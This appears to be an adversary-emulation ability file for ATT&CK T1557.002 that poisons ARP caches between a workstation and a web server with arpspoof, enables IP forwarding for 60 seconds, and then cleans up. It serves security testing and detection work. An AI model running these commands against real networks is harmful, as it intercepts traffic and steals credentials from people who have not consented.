---
id: credential_access_arp_poison
name: ARP Cache Poisoning
description: >
  Envenena la cache ARP entre workstation y webserver
  para posicionarse on-path. T1557.002.
tactic: credential-access
technique:
  attack_id: T1557.002
  name: ARP Cache Poisoning
platforms:
  linux:
    sh:
      command: |
        source /opt/mitm-scripts/targets.sh
        echo 1 > /proc/sys/net/ipv4/ip_forward
        timeout 60 arpspoof -i eth0 -t $WORKSTATION_IP $WEBSERVER_IP &
        timeout 60 arpspoof -i eth0 -t $WEBSERVER_IP $WORKSTATION_IP &
        sleep 60
        echo 0 > /proc/sys/net/ipv4/ip_forward
cleanup:
  - |
    echo 0 > /proc/sys/net/ipv4/ip_forward
    killall arpspoof 2>/dev/null
tags:
  - credential-access
  - T1557.002
  - MITM
